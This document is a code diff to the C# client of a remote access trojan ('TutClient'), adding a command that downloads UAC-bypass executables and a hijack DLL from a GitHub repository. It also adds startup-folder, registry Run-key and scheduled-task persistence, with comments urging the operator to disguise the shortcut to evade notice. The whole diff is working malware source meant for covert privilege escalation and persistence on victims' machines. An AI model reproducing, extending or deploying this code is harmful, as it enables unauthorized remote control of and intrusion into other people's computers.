@@ -64,6 +64,7 @@ namespace TutClient
             CMD_STREAM_READ = 0X07,
             FILE_AND_DIR_NOT_FOUND = 0x08,
             FILE_EXISTS = 0x09,
+            ADMIN_REQUIRED = 0x10
         }
 
         private static bool Handler(CtrlType sig)
@@ -199,6 +200,20 @@ namespace TutClient
             sendCommand("ipc§" + "tut_client_proxy" + "§" + msg);
         }
 
+        private static string ResolveDns(string input)
+        {
+            try
+            {
+                string ipAddr = Dns.GetHostAddresses(input)[0].ToString();
+                return ipAddr;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Dns Resolve on input: " + input + " failed\r\n" + ex.Message);
+                return null;
+            }
+        }
+
         private static string GetIPAddress(string input)
         {
             if (input == "") return null;
@@ -234,17 +249,12 @@ namespace TutClient
                     else
                     {
                         //Pretend that the input is a hostname
-                        try
-                        {
-                            string ipAddr = Dns.GetHostAddresses(input)[0].ToString();
-                            return ipAddr;
-                        }
-                        catch (Exception ex)
-                        {
-                            Console.WriteLine("Dns Resolve on input: " + input + " failed\r\n" + ex.Message);
-                            return null;
-                        }
+                        return ResolveDns(input);
                     }
+                }
+                else
+                {
+                    return ResolveDns(input);
                 }
             }
 
@@ -1182,6 +1192,15 @@ namespace TutClient
                 sendCommand("setstart§" + app);
             }
 
+            if (text == "uacload")
+            {
+                UAC uac = new UAC();
+                foreach (int progress in uac.AutoLoadBypass())
+                {
+                    sendCommand("uacload§" + progress.ToString());
+                }
+            }
+
             if (text == "uacbypass")
             {
                 UAC uac = new UAC();
@@ -1191,8 +1210,16 @@ namespace TutClient
                     return;
                 }
 
-                bool success = uac.BypassUAC();
-                if (success) sendCommand("uac§s_admin");
+                try
+                {
+                    bool success = uac.BypassUAC();
+                    if (success) sendCommand("uac§s_admin");
+                    else sendCommand("uac§f_admin");
+                }
+                catch (Exception ex)
+                {
+                    uac.ProbeStart(UAC.ProbeMethod.StartUpFolder);
+                }
             }
 
             if (text.StartsWith("writeipc§"))
@@ -1230,6 +1257,20 @@ namespace TutClient
                 int screenNumbers = int.Parse(text.Replace("screenNum", "")) - 1; //because the screens start at 0 not 1 
                 ScreenNumber = screenNumbers;
                 Console.WriteLine(ScreenNumber.ToString());
+            }
+
+            if (text.StartsWith("sprobe§"))
+            {
+                string method = text.Split('§')[1];
+                UAC.ProbeMethod pm = UAC.ProbeMethod.StartUpFolder;
+
+                if (method == "Registry") pm = UAC.ProbeMethod.Registry;
+                else if (method == "Task Scheduler") pm = UAC.ProbeMethod.TaskScheduler;
+                else if (method == "Startup Folder") pm = UAC.ProbeMethod.StartUpFolder;
+                else return;
+
+                UAC uac = new UAC();
+                uac.ProbeStart(pm);
             }
         }
 
@@ -1837,6 +1878,49 @@ namespace TutClient
 
     public class UAC
     {
+        private void CreateShortcut(string targetFile, string linkedFile)
+        {
+            try
+            {
+                IWshRuntimeLibrary.IWshShell_Class wsh = new IWshRuntimeLibrary.IWshShell_Class();
+                IWshRuntimeLibrary.IWshShortcut shortcut = (IWshRuntimeLibrary.IWshShortcut) wsh.CreateShortcut(targetFile);
+                shortcut.TargetPath = linkedFile;
+                shortcut.WorkingDirectory = Application.StartupPath;
+                shortcut.Save();
+                Console.WriteLine("Shortcut created");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error creating shortcut: " + ex.Message);
+            }
+        }
+
+        public IEnumerable<int> AutoLoadBypass()
+        {
+            //I am not responsible for any damage done! And i am not spreading the malware, using it is optional!
+            const string link64 = "https://github.com/AdvancedHacker101/Bypass-Uac/raw/master/Compiled/x64%20bit/";
+            const string link86 = "https://github.com/AdvancedHacker101/Bypass-Uac/raw/master/Compiled/x86%20bit/";
+            const string unattendFile = "https://raw.githubusercontent.com/AdvancedHacker101/Bypass-Uac/master/unattend.xml";
+            string[] filesToLoad = { "copyFile.exe", "testAnything.exe", "testDll.dll" };
+            string[] localName = { "copyFile.exe", "launch.exe", "dismcore.dll" };
+            bool is64 = Is64Bit();
+            string link = "";
+            if (is64) link = link64;
+            else link = link86;
+            int index = 0;
+            WebClient wc = new WebClient();
+
+            foreach (string file in filesToLoad)
+            {
+                wc.DownloadFile(link + file, Application.StartupPath + "\\" + localName[index]);
+                index++;
+                yield return 25;
+            }
+
+            wc.DownloadFile(unattendFile, Application.StartupPath + "\\unattend.xml");
+            yield return 25;
+        }
+
         public enum ProbeMethod
         {
             StartUpFolder,
@@ -1849,10 +1933,16 @@ namespace TutClient
             if (pm == ProbeMethod.StartUpFolder)
             {
                 string suFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-                File.Copy(Application.ExecutablePath, suFolder + "\\" + new FileInfo(Application.ExecutablePath).Name);
+                string linkFile = suFolder + "\\" + "client.lnk"; //Be creative if you want to get away with it :)
+                if (!File.Exists(linkFile)) CreateShortcut(linkFile, Application.ExecutablePath);
             }
             else if (pm == ProbeMethod.Registry)
             {
+                if (!IsAdmin())
+                {
+                    Program.reportError(Program.errorType.ADMIN_REQUIRED, "Failed to probe registry", "R.A.T is not running as admin! You can try to bypass the uac or use the startup folder method!");
+                    return;
+                }
                 RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run", true);
                 if (key.GetValue("tut_client") != null) key.DeleteValue("tut_client", false);
                 key.SetValue("tut_client", Application.ExecutablePath);
@@ -1862,6 +1952,11 @@ namespace TutClient
             }
             else if (pm == ProbeMethod.TaskScheduler)
             {
+                if (!IsAdmin())
+                {
+                    Program.reportError(Program.errorType.ADMIN_REQUIRED, "Failed to probe Task Scheduler", "R.A.T is not running as admin! You can try to bypass the uac or use the startup folder method!");
+                    return;
+                }
                 Process deltask = new Process();
                 Process addtask = new Process();
                 deltask.StartInfo.FileName = "cmd.exe";
@@ -1874,7 +1969,7 @@ namespace TutClient
                 addtask.StartInfo.Arguments = "/c schtasks /Create /tn tut_client /tr \"" + Application.ExecutablePath + "\" /sc ONLOGON /rl HIGHEST";
                 addtask.Start();
                 addtask.WaitForExit();
-                Console.WriteLine("Task created sucessfully!");
+                Console.WriteLine("Task created successfully!");
             }
         }
 
@@ -1907,7 +2002,7 @@ namespace TutClient
 
             if (!File.Exists(dismCoreDll) || !File.Exists(copyFile) || !File.Exists(unattendFile) || !File.Exists(launcherFile))
             {
-                Program.reportError(Program.errorType.FILE_NOT_FOUND, "UAC Bypass", "One or more of the core files not found, please upload them manually");
+                //Program.reportError(Program.errorType.FILE_NOT_FOUND, "UAC Bypass", "One or more of the core files not found, please use autoload");
                 return false;
             }
 
